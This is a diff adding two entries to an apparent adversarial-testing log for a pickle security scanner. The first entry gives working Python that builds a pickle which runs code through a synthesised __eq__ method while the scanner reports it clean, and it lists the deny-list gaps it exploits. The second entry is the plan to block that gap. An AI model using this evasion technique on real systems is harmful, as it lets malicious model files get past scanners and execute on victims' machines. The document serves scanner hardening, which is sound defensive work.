@@ -3843,3 +3843,115 @@ Blocking plan:
 
 Performance note: one literal in the existing magic-method match arm, no
 object-lifetime or reference-count modeling.
+
+## Turn 81 - `__eq__` rich-comparison method gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using a clean comparison helper
+to invoke an attacker-controlled rich-comparison method during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_eq_dunder_eq_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        s("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        s("__eq__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        s(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "eq"),
+        b"h\x01",
+        b"M" + (0o666).to_bytes(2, "little"),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=158`, `bytes_total=158`, `opcode_count=34`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `operator.eq`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.eq` call returns
+  a `DerivedPath` instance at `/tmp/ma_operator_eq_dunder_eq_marker` and does
+  not create the marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_operator_eq_dunder_eq_marker` and returns `None`
+- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
+  subclass with `__eq__ = pathlib.Path.touch`. Calling
+  `operator.eq(instance, 0o666)` dispatches to `instance.__eq__(0o666)`, which
+  calls `Path.touch(instance, mode=0o666)` before `pickle.loads()` returns.
+  Rich comparison methods may return arbitrary objects, so the `None` return
+  from `Path.touch` does not raise.
+
+Why the scanner missed it:
+
+- `__eq__` is not in the suspicious magic-method string list. Current coverage
+  includes serialization hooks, attribute hooks, `__call__`, and `__del__`, but
+  not rich-comparison hooks.
+- `operator.eq` is absent from `DANGEROUS_GLOBALS`; current `operator`
+  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The payload uses only currently clean globals: `builtins.type`,
+  `pathlib.PosixPath`, `pathlib.Path.touch`, and `operator.eq`.
+- The dangerous callable is hidden as a synthesized rich-comparison method, so
+  the final visible call target is a common comparison helper rather than the
+  attacker-selected callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, `__getattr__`,
+  `__getattribute__`, or `__del__`.
+
+Performance note: this is a precise magic-method seed gap. The focused next
+block should add `__eq__` to the suspicious magic-method string list, with an
+oracle regression proving that class construction alone does not create the
+marker but `operator.eq(instance, 0o666)` does. This keeps the hot path to the
+existing string-literal policy scan and avoids rich-comparison flow modeling.
+
+## Turn 82 - Block `__eq__` rich-comparison seeds
+
+Blocking plan:
+
+- Add `__eq__` to the existing suspicious magic-method string list. Equality
+  hooks can route execution through rich-comparison dispatch rather than an
+  explicit dangerous call target.
+- Leave `operator.eq`, `builtins.type`, `pathlib.PosixPath`, and
+  `pathlib.Path.touch` allowed for this focused block. The static signal is the
+  attacker-controlled rich-comparison slot name.
+- Add a CPython oracle regression that builds the manual
+  `type(..., {"__eq__": Path.touch})` payload, verifies scan-time detection on
+  both the construction-only control and `operator.eq` RCE variants, proves the
+  control instance does not create the marker, then proves the equality check
+  creates the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one literal in the existing magic-method match arm, no
+rich-comparison flow modeling.
